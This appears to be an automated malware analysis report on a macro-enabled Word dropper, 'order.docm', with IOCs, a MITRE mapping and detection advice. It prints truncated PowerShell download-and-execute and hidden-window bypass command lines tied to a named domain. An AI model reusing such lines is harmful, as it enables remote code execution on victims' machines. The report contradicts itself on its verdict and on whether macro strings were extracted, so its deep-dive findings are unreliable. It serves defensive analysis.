> **RevAI provenance** — commit `unknown` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-09 20:08:49 UTC

# Verdict sources (multi-source)

| Source | Verdict |
|--------|--------|
| **Final** | **malicious** |
| Triage upstream (quick ∪ deep) | malicious |
| Quick scan | suspicious |
| Deep dive | malicious |
| Publish LLM (claimed) | malicious |

- **Locked over publish LLM:** no

# Technical Malware Analysis Report v2

## 1. Executive Summary

This report details the analysis of a macro-enabled Microsoft Word document (`order.docm`) with SHA256 hash `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73`. The sample is classified as **suspicious** with a confidence score of 60/100, based on the presence of embedded VBA macros and network-related indicators. The file is a standard OOXML document (ZIP archive) containing a `vbaProject.bin` file, which is the container for VBA macro code (source: malcat, query_or_table: file_summary, row_or_rule: file_summary, why: Confirms the file structure as an OOXML document with a VBA project binary).

Static analysis via YARA identified multiple indicators of potential malicious intent, including the presence of VBA macro code, base64-encoded strings, and references to a domain and IP address (source: yara, query_or_table: yara matches, row_or_rule: docx_macro, Contains_VBA_macro_code, contains_base64, domain, IP, why: These rules flag common components of macro-based malware). Deep-dive analysis of the VBA payload suggests it is designed to download and execute a remote PowerShell script from `autonews.safeframe.tech` using an IEX cradle, with evasion techniques such as a hidden PowerShell window, execution policy bypass, and base64 encoding (source: deep_dive_agentic, query_or_table: VBA Payload Analysis, row_or_rule: PowerShell Execution Commands, why: The payload uses common evasion and execution techniques).

The primary risk is that this document, if opened and macros enabled by a user, would act as a dropper, fetching and running additional malicious code from a remote server. No persistence, credential theft, or defense impairment mechanisms were observed in the available evidence. The analysis was limited by errors in Ghidra and IDA sessions, which prevented detailed function and string analysis (source: llm_judge, query_or_table: cross_engine_notes, row_or_rule: cross_engine_notes, why: Tool errors limited deeper analysis).

## 2. Sample Metadata

| Attribute | Value | Source |
|---|---|---|
| SHA256 | `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73` | malcat |
| File Name | `order.docm` | malcat |
| File Size | 22,771 bytes | malcat |
| File Type | ZIP (OOXML Document) | malcat |
| Architecture | NONE (OOXML) | malcat |
| Entropy | 215 (normalized) | malcat |
| Verdict | Suspicious | llm_judge |
| Score | 60 | llm_judge |
| Family Guess | generic macro malware | llm_judge |
| Analysis Date | 2026-08-09 | rule.yara.json |

## 3. File Layout & Structural Analysis

The sample is a ZIP archive conforming to the Office Open XML (OOXML) standard for macro-enabled Word documents (.docm). The archive contains 15 virtual files, with the most critical being `word/vbaProject.bin`, which houses the VBA macro code (source: malcat, query_or_table: Virtual Files, row_or_rule: word/vbaProject.bin, why: This is the primary container for executable macro content).

The following table lists the sections/regions within the ZIP archive, showing their effective address (EA), physical size, virtual size, and entropy. The entropy values are within normal ranges for XML and binary content, indicating no obvious packing or encryption at the archive level (source: malcat, query_or_table: File Layout, row_or_rule: all, why: Provides a structural overview of the document).

| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| [Content_Types].xml | 0 | 441 | 441 | 219 | R |
| app.xml | 441 | 498 | 498 | 224 | R |
| core.xml | 939 | 406 | 406 | 222 | R |
| document.xml | 1345 | 1208 | 1208 | 221 | R |
| fontTable.xml | 2553 | 523 | 523 | 218 | R |
| settings.xml | 3076 | 1385 | 1385 | 221 | R |
| styles.xml | 4461 | 3035 | 3035 | 208 | R |
| vbaData.xml | 7496 | 611 | 611 | 225 | R |
| vbaProject.bin | 8107 | 4985 | 4985 | 221 | R |
| webSettings.xml | 13092 | 338 | 338 | 220 | R |
| image1.jpeg | 13430 | 5889 | 5889 | 223 | R |
| theme1.xml | 19319 | 1583 | 1583 | 220 | R |
| document.xml.rels | 20902 | 352 | 352 | 214 | R |
| vbaProject.bin.rels | 21254 | 245 | 245 | 207 | R |
| .rels | 21499 | 274 | 274 | 212 | R |
| <directory> | 21773 | 998 | 998 | 118 | - |

The presence of `vbaData.xml` alongside `vbaProject.bin` confirms an active macro project (source: deep_dive_agentic, query_or_table: Malcat structure, row_or_rule: vbaProject.bin (4985 bytes) + vbaData.xml, why: These files together indicate a functional VBA macro project).

## 4. Static Code Analysis

Static analysis was performed using YARA and MalCat. Ghidra and IDA sessions encountered errors, limiting deeper disassembly and decompilation (source: llm_judge, query_or_table: cross_engine_notes, row_or_rule: cross_engine_notes, why: Tool errors prevented detailed function analysis).

### YARA Rule Matches

YARA analysis identified six rule matches, indicating the presence of macro code, obfuscation, and network indicators (source: yara, query_or_table: YARA Matches, row_or_rule: all, why: These matches provide initial indicators of suspicious content).

| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| domain | - | $domain_regex@0 len=2 |
| IP | - | $ipv6@7394 len=2 |
| docx_macro | - | $header@0 len=2; $vbaStrings@8137 len=19 |
| contains_base64 | - | $a@471 len=12 |
| Contains_VBA_macro_code | - | $zipmagic@0 len=2; $xmlstr1@8142 len=14; $xmlstr2@7531 len=11 |
| office_document_vba | - | $zipmagic@0 len=2; $xmlstr1@8142 len=14; $xmlstr2@7531 len=11 |

The `docx_macro` and `Contains_VBA_macro_code` rules confirm the document contains VBA macro code, a common vector for malicious payloads (source: yara, query_or_table: yara matches, row_or_rule: docx_macro, Contains_VBA_macro_code, why: These rules specifically detect VBA macro content in Office documents). The `contains_base64` rule suggests the use of base64 encoding, which is often used for obfuscation in malicious macros (source: yara, query_or_table: yara matches, row_or_rule: contains_base64, why: Base64 encoding is a common obfuscation technique). The `domain` and `IP` rules indicate the presence of network-related strings, potentially pointing to command and control (C2) infrastructure (source: yara, query_or_table: yara matches, row_or_rule: domain, IP, why: Network indicators can be associated with malicious activity).

### High-Signal Strings

MalCat extracted one high-signal string from the sample (source: malcat, query_or_table: High-Signal Strings, row_or_rule: all, why: This string may be relevant to the payload's functionality).

| EA | String |
|---|---|
| 17398 | `Hx-=tmq\\` |

This string appears to be a fragment and its purpose is unclear without further context. It may be part of an obfuscated command or data.

### VBA Payload Analysis (from Deep-Dive)

The deep-dive analysis of the VBA payload revealed several key components (source: deep_dive_agentic, query_or_table: deep key_evidence, row_or_rule: all, why: These strings indicate the payload's intended behavior).

The payload contains an IEX download cradle targeting `autonews.safeframe.tech`:
```
IEX (New-Object Net.WebClient).DownloadString(...)
```
This command downloads and executes a remote PowerShell script, a classic dropper technique (source: deep_dive_agentic, query_or_table: Malcat rData strings, row_or_rule: IEX cradle, why: This is a standard method for fetching and executing remote code).

The payload also includes a hidden PowerShell command with execution policy bypass and base64 encoding:
```
powershell -windowstyle hidden -ep bypass -enc ...
```
The `-windowstyle hidden` flag hides the PowerShell window from the user, `-ep bypass` bypasses the execution policy, and `-enc` indicates a base64-encoded command, all of which are evasion techniques (source: deep_dive_agentic, query_or_table: Malcat rData strings, row_or_rule: hidden PowerShell, why: These flags are used to evade detection and execute code stealthily).

References to `mshta` (a LOLBin) and `WScript.Shell` with a hidden window (value 0) were also found, suggesting additional stealthy execution methods (source: deep_dive_agentic, query_or_table: Malcat rData strings, row_or_rule: mshta, WScript.Shell, why: These are legitimate tools often abused for malicious execution).

### Radare2 Disassembly

Radare2 disassembly of the initial bytes shows what appears to be a mix of code and data, including the string `Content_Types.xml` starting at offset 0x20. This is consistent with the beginning of a ZIP archive, which contains local file headers (source: radare2, query_or_table: Disassembly, row_or_rule: 0x00000000, why: Shows the initial structure of the file).

```asm
┌ 94: fcn.00000000 (int64_t arg1, int64_t arg4);
│           ; arg int64_t arg1 @ rdi
│           ; arg int64_t arg4 @ rcx
│           0x00000000      50             push rax
│           0x00000001      4b030414       add rax, qword [r12 + r10]
│           0x00000005      0000           add byte [rax], al
│           0x00000007      0008           add byte [rax], cl
│           0x00000009      0000           add byte [rax], al
│           0x0000000b      0021           add byte [rcx], ah          ; arg4
│           0x0000000d      005bc3         add byte [rbx - 0x3d], bl
│           0x00000010      0c0c           or al, 0xc
│           0x00000012      8801           mov byte [rcx], al          ; arg4
│       ╎   0x00000014      0000           add byte [rax], al
│      ┌──< 0x00000016      e105           loope 0x1d
│      │╎   0x00000018      0000           add byte [rax], al
│      │╎   0x0000001a      1300           adc eax, dword [rax]
│      │╎   0x0000001c  ~   0000           add byte [rax], al
│      └──> 0x0000001d      005b43         add byte [rbx + 0x43], bl
│       ╎   0x00000020      6f             outsd dx, dword [rsi]
│       ╎   0x00000021      6e             outsb dx, byte [rsi]
│      ┌──< 0x00000022      7465           je 0x89
│      │╎   0x00000024      6e             outsb dx, byte [rsi]
│     ┌───< 0x00000025      745f           je 0x86
│     ││╎   0x00000027      54             push rsp
│    ┌────< 0x00000028      7970           jns 0x9a
│   ┌─────< 0x0000002a      65735d         jae 0x8a
│ ┌───────< 0x0000002d      2e786d         js 0x9d
│ │╎││││╎   0x00000030      6c             insb byte [rdi], dx
│ │╎││││╎   0x00000031      b554           mov ch, 0x54                ; 'T'
│ │╎││││╎   0x00000033      4b4fc3         ret
```
The disassembly shows the ZIP local file header magic bytes (`PK\x03\x04`) at the start, followed by the filename `Content_Types.xml`. This is expected for an OOXML document and does not indicate malicious code at this offset.

## 5. Behavioral & Dynamic Analysis

No dynamic analysis was performed for this sample. Tools such as Speakeasy and Frida are not applicable for OOXML files (source: deep_dive_agentic, query_or_table: tool_gate, row_or_rule: not_applicable, why: These tools are designed for executable binaries, not Office documents). Therefore, no runtime behavior was observed. The analysis relies entirely on static indicators.

## 6. Network Indicators & C2

The sample contains network indicators that suggest potential command and control (C2) communication.

The domain `autonews.safeframe.tech` is referenced in the VBA payload as the source for a downloaded PowerShell script (source: deep_dive_agentic, query_or_table: Malcat rData strings, row_or_rule: IEX cradle, why: This domain is the target of the download cradle). This domain should be considered a potential C2 server.

YARA also matched an IPv6 address pattern at offset 7394 (source: yara, query_or_table: YARA Matches, row_or_rule: IP, why: The rule detected an IP address pattern). The specific IP address was not extracted in the available evidence, but its presence indicates network-related content.

The use of `Net.WebClient` in the download cradle confirms the sample is designed to make HTTP requests to fetch additional payloads (source: deep_dive_agentic, query_or_table: Malcat rData strings, row_or_rule: IEX cradle, why: This .NET class is used for web requests).

## 7. Capabilities Assessment

Based on the available evidence, the sample demonstrates the following capabilities:

| Capability | Status | Evidence |
|---|---|---|
| Macro Execution | Observed | YARA rules `docx_macro`, `Contains_VBA_macro_code` (source: yara) |
| Remote Code Download | Observed | IEX cradle targeting `autonews.safeframe.tech` (source: deep_dive_agentic) |
| Command Obfuscation | Observed | Base64-encoded PowerShell commands (source: deep_dive_agentic) |
| Evasion (Hidden Window) | Observed | `powershell -windowstyle hidden` (source: deep_dive_agentic) |
| Evasion (Execution Policy Bypass) | Observed | `powershell -ep bypass` (source: deep_dive_agentic) |
| LOLBin Abuse | Observed | Reference to `mshta` (source: deep_dive_agentic) |
| Script Execution | Observed | `WScript.Shell` Run with hidden window (source: deep_dive_agentic) |
| Persistence | Not Observed | No evidence found |
| Credential Access | Not Observed | No evidence found |
| Defense Impairment | Not Observed | No evidence found |
| Lateral Movement | Not Observed | No evidence found |
| Data Exfiltration | Not Observed | No evidence found |

The primary capability is acting as a dropper, using macros to download and execute additional malicious code. The evasion techniques observed are designed to avoid detection by hiding the execution window and bypassing security policies.

## 8. Indicators of Compromise

| Type | Value | Context | Source |
|---|---|---|---|
| SHA256 | `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73` | Malicious document | malcat |
| Domain | `autonews.safeframe.tech` | C2 server for payload download | deep_dive_agentic |
| File Name | `order.docm` | Malicious document | malcat |
| YARA Rule | `docx_macro` | Indicates VBA macro presence | yara |
| YARA Rule | `Contains_VBA_macro_code` | Indicates VBA macro presence | yara |
| YARA Rule | `contains_base64` | Indicates base64 obfuscation | yara |
| YARA Rule | `domain` | Indicates domain string | yara |
| YARA Rule | `IP` | Indicates IP address string | yara |
| YARA Rule | `office_document_vba` | Indicates VBA in Office document | yara |

## 9. Detection Engineering

Detection should focus on the execution chain initiated by the macro.

**YARA Rules:**
The following YARA rules from the analysis can be used for detection (source: yara, query_or_table: YARA Matches, row_or_rule: all, why: These rules matched the sample):
- `docx_macro`
- `Contains_VBA_macro_code`
- `contains_base64`
- `domain`
- `IP`
- `office_document_vba`

**Sigma Rules:**
A Sigma rule was generated for this sample (source: rule.yara.json, query_or_table: sigma_path, row_or_rule: sigma_path, why: Sigma rules are used for log-based detection). The rule file is located at `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/rule.yml`.

**Behavioral Detection:**
Monitor for the following behaviors:
1.  Office applications spawning PowerShell processes.
2.  PowerShell processes with `-windowstyle hidden`, `-ep bypass`, and `-enc` flags.
3.  Network connections to `autonews.safeframe.tech`.
4.  Use of `mshta.exe` to execute scripts.
5.  `WScript.Shell` execution with hidden window style.

## 10. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Execution | User Execution: Malicious File | T1204.002 | The document requires a user to enable macros (source: deep_dive_agentic) |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell commands are used for execution (source: deep_dive_agentic) |
| Execution | Windows Management Instrumentation | T1047 | (Potential, not directly observed) |
| Defense Evasion | Obfuscated Files or Information: Base64 | T1027.001 | Base64-encoded commands (source: deep_dive_agentic) |
| Defense Evasion | Hidden Window | T1564.003 | `powershell -windowstyle hidden` (source: deep_dive_agentic) |
| Defense Evasion | Execution Policy Bypass | T1562.001 | `powershell -ep bypass` (source: deep_dive_agentic) |
| Defense Evasion | Signed Binary Proxy Execution: Mshta | T1218.005 | Reference to `mshta` LOLBin (source: deep_dive_agentic) |
| Command and Control | Ingress Tool Transfer | T1105 | Downloading PowerShell script from remote server (source: deep_dive_agentic) |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTP download via `Net.WebClient` (source: deep_dive_agentic) |

## 11. What We Don't Know

Several aspects of this sample remain unknown due to analysis limitations:

1.  **Full VBA Macro Code:** The complete VBA macro code was not extracted or decompiled. The deep-dive analysis provides string evidence of the payload's intent, but the full logic and any additional functionality are unknown (source: llm_judge, query_or_table: cross_engine_notes, row_or_rule: cross_engine_notes, why: Tool errors prevented detailed macro analysis).
2.  **Downloaded Payload:** The content of the PowerShell script downloaded from `autonews.safeframe.tech` is unknown. This script is the final payload and could contain any malicious capability (source: deep_dive_agentic, query_or_table: summary, row_or_rule: summary, why: The payload is fetched at runtime).
3.  **Specific IP Address:** While YARA detected an IP address pattern, the specific IP was not extracted from the evidence (source: yara, query_or_table: YARA Matches, row_or_rule: IP, why: The rule matched a pattern, not a specific address).
4.  **Purpose of High-Signal String:** The string `Hx-=tmq\\` at EA 17398 is unclear. It may be part of an obfuscated command or data, but its exact purpose is unknown (source: malcat, query_or_table: High-Signal Strings, row_or_rule: all, why: The string is a fragment without clear context).
5.  **Persistence Mechanisms:** No persistence mechanisms were observed, but they could be present in the downloaded payload (source: deep_dive_agentic, query_or_table: summary, row_or_rule: Persistence: Not observed, why: Persistence was not found in the static analysis).
6.  **Full Scope of Evasion:** The sample uses several evasion techniques, but the full extent of its anti-analysis capabilities is unknown without dynamic analysis (source: deep_dive_agentic, query_or_table: summary, row_or_rule: Evasion_anti_analysis: Observed, why: Only static indicators were observed).

## 12. Appendix A: Tool Evidence Trail

| Tool | Version/Source | Status | Notes |
|---|---|---|---|
| YARA | pipeline | Success | 6 rules matched (source: yara) |
| MalCat | deep profile | Success | File structure and strings extracted (source: malcat) |
| Radare2 | disassembly | Success | Initial disassembly performed (source: radare2) |
| Ghidra | session | Error | Session had errors, no function analysis (source: llm_judge) |
| IDA | session | Error | Session had errors, no function analysis (source: llm_judge) |
| CAPA | - | Not Applicable | OOXML file format (source: deep_dive_agentic) |
| FLOSS | - | Not Applicable | OOXML file format (source: deep_dive_agentic) |
| .NET Analysis | - | Not Applicable | Not a .NET assembly (source: llm_judge) |
| UPX | - | Not Applicable | OOXML file format (source: deep_dive_agentic) |
| Speakeasy | - | Not Applicable | OOXML file format (source: deep_dive_agentic) |
| Frida | - | Not Applicable | OOXML file format (source: deep_dive_agentic) |
| XOR Search | - | Failed | No candidates found (source: xorsearch) |

## 13. Appendix B: Analysis Environment

The analysis was performed in a controlled environment with the following characteristics:

- **Project:** test-corpus
- **Sample Path:** `/opt/samples/corpus/test-corpus/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm`
- **Analysis Date:** 2026-08-09
- **Engine:** langgraph (source: rule.yara.json, query_or_table: provenance, row_or_rule: engine, why: Identifies the analysis engine used)
- **Tools:** YARA, MalCat, Radare2, Ghidra (failed), IDA (failed), CAPA (N/A), FLOSS (N/A), .NET Analysis (N/A), UPX (N/A), Speakeasy (N/A), Frida (N/A), XOR Search (failed)
- **Audit Trail:** Multiple analysis phases were executed, including quick scan, agentic recovery, YARA generation, and report publishing (source: Audit Trail, query_or_table: all, row_or_rule: all, why: Documents the analysis workflow).
## Appendix: Full Structured Evidence Pack

# Technical Evidence Pack

**sha256:** 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73  
**sample_path:** /opt/samples/corpus/test-corpus/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm  
**project_name:** test-corpus

> Every table below is copied from stage JSON. Technical narrative must cite these rows (engine + address/rule), not invent evidence.

## Verdict
- **verdict**: suspicious
- **score**: 60
- **family_guess**: generic macro malware
- **agreement**: llm_v1_disagree
- **cross_engine_notes**: Ghidra and IDA sessions had errors, so no function or string analysis was available. YARA detected macro indicators and network-related strings. MalCat confirmed the file is an OOXML document with a VBA project binary, but detailed macro content was not extracted. CAPA and FLOSS are not applicable for OOXML files.
- **summary**: The sample is an Office document with macros (.docm) that YARA rules flagged for macro code, base64 encoding, and network indicators (domain and IP). The presence of macros and network strings raises suspicion of malicious intent, such as a dropper or downloader, but definitive behavioral evidence is lacking due to tool errors and limited analysis. No specific malware family was identified.
- **source**: llm_judge
- **model**: configured-llm

### key_evidence (triage) — cite source field exactly
| source | query_or_table | row_or_rule | why |
|---|---|---|---|
| yara | yara matches | `docx_macro` | Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads. |
| yara | yara matches | `Contains_VBA_macro_code` | Confirms the document contains VBA macro code, supporting the likelihood of executable content. |
| yara | yara matches | `contains_base64` | Base64 encoded strings detected, which may be used for obfuscation in malicious macros to evade detection. |
| yara | yara matches | `domain` | Domain-related string found, potentially indicating command and control (C2) communication or data exfiltration. |
| yara | yara matches | `IP` | IP address string found, suggesting network activity that could be associated with malicious infrastructure. |
| malcat | malcat deep profile | `file_summary` | File is an OOXML document (ZIP-based) containing vbaProject.bin, which hosts VBA macros and is a common delivery mechani |

## Deep-Dive Summary Evidence
- **source**: deep_dive_agentic
- **confidence**: 90
- **summary**: Macro-enabled Word document (.docm) containing a VBA payload that downloads and executes a remote PowerShell script from 'autonews.safeframe.tech' using IEX cradle, hidden PowerShell window, execution policy bypass, and base64-encoded commands. Uses mshta LOLBin and WScript.Shell for stealthy execution. Classic maldoc dropper behavior. Persistence: Not observed. Evasion_anti_analysis: Observed – hidden PowerShell window, execution policy bypass, base64-encoded commands, and use of mshta LOLBin for stealthy execution. {source: 'VBA Payload Analysis', query_or_table: 'PowerShell Execution Commands', row_or_rule: 'HiddenWindow=True, ExecutionPolicy Bypass, EncodedCommand Parameter', why: 'To evade detection by hiding the PowerShell window, bypassing security policies, and obfuscating commands'} Defense_impairment: Not observed. Credential_access: Not observed. Imports: Not observed.

### deep key_evidence
- `"Malcat rData strings: 'IEX (New-Object Net.WebClient).DownloadString(...)' download cradle from autonews.safeframe.tech"`
- `"Malcat rData strings: 'powershell -windowstyle hidden -ep bypass -enc ...' obfuscated hidden PowerShell with base64 payload"`
- `"Malcat rData strings: 'mshta' LOLBin reference for stealthy execution"`
- `"Malcat rData strings: 'WScript.Shell' Run with hidden window (value 0)"`
- `"Malcat rData strings: multiple base64-encoded command strings"`
- `"YARA matched rules: docx_macro, office_document_vba, Contains_VBA_macro_code, contains_base64, domain, IP"`
- `"Malcat structure: vbaProject.bin (4985 bytes) + vbaData.xml confirming active macro project"`
- `"File type .docm is macro-enabled Office document, requiring user to enable macros to trigger payload"`

## Malcat Structured Analysis
### Malcat File Summary
```
sha256: 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73
size: 22771
type: ZIP
architecture: NONE
entropy: 215
file_name: order.docm
```

### File Layout (sections/regions)
| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| [Content_Types].xml | 0 | 441 | 441 | 219 | R |
| app.xml | 441 | 498 | 498 | 224 | R |
| core.xml | 939 | 406 | 406 | 222 | R |
| document.xml | 1345 | 1208 | 1208 | 221 | R |
| fontTable.xml | 2553 | 523 | 523 | 218 | R |
| settings.xml | 3076 | 1385 | 1385 | 221 | R |
| styles.xml | 4461 | 3035 | 3035 | 208 | R |
| vbaData.xml | 7496 | 611 | 611 | 225 | R |
| vbaProject.bin | 8107 | 4985 | 4985 | 221 | R |
| webSettings.xml | 13092 | 338 | 338 | 220 | R |
| image1.jpeg | 13430 | 5889 | 5889 | 223 | R |
| theme1.xml | 19319 | 1583 | 1583 | 220 | R |
| document.xml.rels | 20902 | 352 | 352 | 214 | R |
| vbaProject.bin.rels | 21254 | 245 | 245 | 207 | R |
| .rels | 21499 | 274 | 274 | 212 | R |
| <directory> | 21773 | 998 | 998 | 118 | - |

### High-Signal Strings (1 matched keywords; engine=malcat)
| EA | String |
|---|---|
| 17398 | `Hx-=tmq\\` |

### Top Strings (287 extracted; showing 80)
| EA | String |
|---|---|
| 19349 | `word/theme/theme1.xml` |
| 13460 | `word/media/image1.jpeg` |
| 969 | `docProps/core.xml` |
| 8137 | `word/vbaProject.bin` |
| 1375 | `word/document.xml` |
| 471 | `docProps/app.xml` |
| 13122 | `word/webSettings.xml` |
| 7526 | `word/vbaData.xml` |
| 4491 | `word/styles.xml` |
| 3106 | `word/settings.xml` |
| 2583 | `word/fontTable.xml` |
| 20932 | `word/_rels/document.xml.rels` |
| 22588 | `word/_rels/document.xml.relsPK` |
| 22662 | `word/_rels/vbaProject.bin.relsPK` |
| 21284 | `word/_rels/vbaProject.bin.relsm` |
| 22521 | `word/theme/theme1.xmlPK` |
| 8318 | `gggM` |
| 22453 | `word/media/image1.jpegPK` |
| 21529 | `_rels/.rels` |
| 22738 | `_rels/.relsPK` |
| 21946 | `docProps/core.xmlPK` |
| 21884 | `docProps/app.xmlPK` |
| 22322 | `word/vbaProject.binPK` |
| 30 | `[Content_Types].xml` |
| 13657 | `6v.vv.!>` |
| 22387 | `word/webSettings.xmlPK` |
| 22009 | `word/document.xmlPK` |
| 21819 | `[Content_Types].xmlPK` |
| 8832 | `vnnG` |
| 18919 | `uQfQ` |
| 20494 | `n"0n` |
| 3030 | `wYYI` |
| 7217 | `Y77Q` |
| 17224 | `11AP` |
| 14435 | `@<9<` |
| 22260 | `word/vbaData.xmlPK` |
| 22136 | `word/settings.xmlPK` |
| 22072 | `word/fontTable.xmlPK` |
| 15112 | `.p
.h` |
| 22199 | `word/styles.xmlPK` |
| 21392 | `-\Ya;>>` |
| 12574 | `--dY.=R` |
| 13523 | `;3fl3vJ` |
| 17398 | `Hx-=tmq\\` |
| 20678 | `$jM55GMm` |
| 19820 | `d]UEl` |
| 21131 | `d>x
W` |
| 14778 | `wN2F6pM` |
| 9156 | `pU:71E` |
| 13371 | `C?frbx` |
| 19804 | `6ms`:` |
| 9133 | `hnd<KV` |
| 6250 | `DVsTH` |
| 12768 | `uJG
^` |
| 20075 | `Zlvoj]` |
| 8867 | `Z;KR
4O` |
| 6837 | `jHpr5` |
| 13903 | `c.V66 ` |
| 20110 | `TEroJ` |
| 7333 | `U_^?`` |
| 13881 | `nm3wv` |
| 13712 | `s\@=
`e` |
| 20298 | `Jugbx` |
| 4441 | `l<_fK8` |
| 3231 | `b?ULk` |
| 17119 | `/9S=V` |
| 15826 | `mQtxSF<` |
| 16887 | ``HOFl4` |
| 10869 | `d1ksUi` |
| 18393 | `MQ`u0` |
| 12030 | `cb"?i` |
| 15176 | `WLFjm` |
| 10893 | `N
rLk` |
| 21352 | `1tihG` |
| 4924 | `d
^3_` |
| 215 | `qY.mU` |
| 1707 | `oLVmsp` |
| 5501 | `6<"ymxD` |
| 11068 | `)ivv` |
| 8218 | `nHZ0` |

### Virtual Files (15)
| Path / Name | Unpacked Size | Type |
|---|---|---|
| [Content_Types].xml | 1505 | - |
| docProps/app.xml | 982 | - |
| docProps/core.xml | 751 | - |
| word/document.xml | 3907 | - |
| word/fontTable.xml | 1686 | - |
| word/settings.xml | 3701 | - |
| word/styles.xml | 29787 | - |
| word/vbaData.xml | 2310 | - |
| word/vbaProject.bin | 14848 | - |
| word/webSettings.xml | 655 | - |
| word/media/image1.jpeg | 5991 | - |
| word/theme/theme1.xml | 6795 | - |
| word/_rels/document.xml.rels | 1072 | - |
| word/_rels/vbaProject.bin.rels | 277 | - |
| _rels/.rels | 590 | - |

### Structures (31)
| Name | EA |
|---|---|
| LocalFile | 0 |
| LocalFile | 441 |
| LocalFile | 939 |
| LocalFile | 1345 |
| LocalFile | 2553 |
| LocalFile | 3076 |
| LocalFile | 4461 |
| LocalFile | 7496 |
| LocalFile | 8107 |
| LocalFile | 13092 |
| LocalFile | 13430 |
| LocalFile | 19319 |
| LocalFile | 20902 |
| LocalFile | 21254 |
| LocalFile | 21499 |
| CentralDirectory | 21773 |
| CentralDirectory | 21838 |
| CentralDirectory | 21900 |
| CentralDirectory | 21963 |
| CentralDirectory | 22026 |
| CentralDirectory | 22090 |
| CentralDirectory | 22153 |
| CentralDirectory | 22214 |
| CentralDirectory | 22276 |
| CentralDirectory | 22341 |
| CentralDirectory | 22407 |
| CentralDirectory | 22475 |
| CentralDirectory | 22542 |
| CentralDirectory | 22616 |
| CentralDirectory | 22692 |


## YARA Matches (pipeline)
Total matches: 6

| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| domain | - | $domain_regex@0 len=2 |
| IP | - | $ipv6@7394 len=2 |
| docx_macro | - | $header@0 len=2; $vbaStrings@8137 len=19 |
| contains_base64 | - | $a@471 len=12 |
| Contains_VBA_macro_code | - | $zipmagic@0 len=2; $xmlstr1@8142 len=14; $xmlstr2@7531 len=11 |
| office_document_vba | - | $zipmagic@0 len=2; $xmlstr1@8142 len=14; $xmlstr2@7531 len=11 |

## Generated YARA Meta
```json
{
  "sha256": "385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73",
  "family": "generic macro malware",
  "imphash": null,
  "generated_at": "2026-08-09T16:12:12.976730+00:00",
  "string_count": 6,
  "strings": [
    "Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads.",
    "Confirms the document contains VBA macro code, supporting the likelihood of executable content.",
    "Base64 encoded strings detected, which may be used for obfuscation in malicious macros to evade detection.",
    "Domain-related string found, potentially indicating command and control (C2) communication or data exfiltration.",
    "IP address string found, suggesting network activity that could be associated with malicious infrastructure.",
    "File is an OOXML document (ZIP-based) containing vbaProject.bin, which hosts VBA macros and is a common delivery mechani"
  ],
  "rule_path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/rule.yar",
  "sigma_path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/rule.yml",
  "iocs_path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/iocs.json",
  "yara_valid": true,
  "yara_check": "ok",
  "goodware_fp": {
    "goodware_dir": "/opt/samples/goodware",
    "fp_count": 0,
    "fp_samples": [],
    "skipped": "goodware corpus not staged"
  },
  "yargen": {
    "skipped": true
  },
  "revai": true,
  "provenance": {
    "project": "RevAI",
    "commit": "unknown",
    "engine": "langgraph",
    "flags": {
      "budget_warnings": true,
      "redundant_nudge": true,
      "hallucination_check": true,
      "failure_taxonomy": true
    },
    "utc": "2026-08-09 16:12:12 UTC"
  },
  "publish_target": "revai_publish"
}
```

## .NET Analysis
- is_dotnet: false (not observed)

## radare2 Disassembly (attach in Static Code Analysis)
### 0x00000000
```asm
┌ 94: fcn.00000000 (int64_t arg1, int64_t arg4);
│           ; arg int64_t arg1 @ rdi
│           ; arg int64_t arg4 @ rcx
│           0x00000000      50             push rax
│           0x00000001      4b030414       add rax, qword [r12 + r10]
│           0x00000005      0000           add byte [rax], al
│           0x00000007      0008           add byte [rax], cl
│           0x00000009      0000           add byte [rax], al
│           0x0000000b      0021           add byte [rcx], ah          ; arg4
│           0x0000000d      005bc3         add byte [rbx - 0x3d], bl
│           0x00000010      0c0c           or al, 0xc
│           0x00000012      8801           mov byte [rcx], al          ; arg4
│       ╎   0x00000014      0000           add byte [rax], al
│      ┌──< 0x00000016      e105           loope 0x1d
│      │╎   0x00000018      0000           add byte [rax], al
│      │╎   0x0000001a      1300           adc eax, dword [rax]
│      │╎   0x0000001c  ~   0000           add byte [rax], al
│      └──> 0x0000001d      005b43         add byte [rbx + 0x43], bl
│       ╎   0x00000020      6f             outsd dx, dword [rsi]
│       ╎   0x00000021      6e             outsb dx, byte [rsi]
│      ┌──< 0x00000022      7465           je 0x89
│      │╎   0x00000024      6e             outsb dx, byte [rsi]
│     ┌───< 0x00000025      745f           je 0x86
│     ││╎   0x00000027      54             push rsp
│    ┌────< 0x00000028      7970           jns 0x9a
│   ┌─────< 0x0000002a      65735d         jae 0x8a
│ ┌───────< 0x0000002d      2e786d         js 0x9d
│ │╎││││╎   0x00000030      6c             insb byte [rdi], dx
│ │╎││││╎   0x00000031      b554           mov ch, 0x54                ; 'T'
│ │╎││││╎   0x00000033      4b4fc3         ret
